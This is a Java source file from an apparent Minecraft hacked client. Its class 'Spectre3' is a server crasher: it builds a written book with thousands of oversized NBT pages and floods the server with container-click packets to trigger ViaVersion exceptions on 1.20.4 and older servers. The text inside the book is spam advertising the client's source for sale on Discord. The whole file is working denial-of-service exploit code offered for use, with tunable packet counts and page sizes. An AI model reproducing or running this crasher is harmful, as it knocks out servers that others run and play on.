package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.nbt.Tag;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
import us.whitedev.protocol.components.data.impl.Filterable;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class Spectre3 implements Crasher {
    private static final String METHOD_NAME = "Spectre3";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int pagesAmount = Integer.parseInt(args[3]);
        int size = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase(Locale.ROOT);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            Filterable<Tag> page = getPageContent(size, type);
            List<Filterable<Tag>> pages = new ArrayList<>(pagesAmount);

            for (int i = 0; i < pagesAmount; ++i)
                pages.add(page);

            DataWrittenBookContent bookContent = new DataWrittenBookContent(
                    new Filterable<>("Xynis", null),
                    mc.player.getName().getString(),
                    1,
                    pages,
                    true
            );

            DataComponents components = new DataComponents();
            components.put(bookContent);

            ItemStack item = new ItemStack(1133, 1, components);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    item, new Int2ObjectArrayMap<>()), packets);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.4&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private Filterable<Tag> getPageContent(int size, String mode){
        Filterable<Tag> page;
        switch (mode){
            case "convert" -> {
                CompoundTag pageNbtBuilder = new CompoundTag();

                for (int i = 0; i < size; ++i)
                    pageNbtBuilder.putString(String.valueOf(i), getXynisLabel());

                page = new Filterable<>(pageNbtBuilder, null);
            }
            default -> {
                ListTag listTag = new ListTag();

                for (int i = 0; i < size; ++i)
                    listTag.add(i, new StringTag(getXynisLabel()));

                page = new Filterable<>(listTag, null);
            }
        }
        return page;
    }

    private String getXynisLabel(){
        return """
                        \s
                        \s
                        BUY SOURCE OF GODISKINGCLIENT ON OUR DISCORD!
                        BEST EXCLUSIVE CRASH/EXPLOIT CLIENT
                        
                        -> JOIN HERE: discord. godisking0584 <-
                        -> SUBSCRIBE TODAY: not up <-
                        \s
                        \s
                        """;
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() { //illegal mode only with size = 0
        return "packets[1], pages[6000], size[1], type[Convert]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Pages", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Convert", "Illegal"})
        );
    }

    @Override
    public String getDescription() {
        return "ViaVersion Exceptions Crasher (1.20.4- Servers)";
    }
}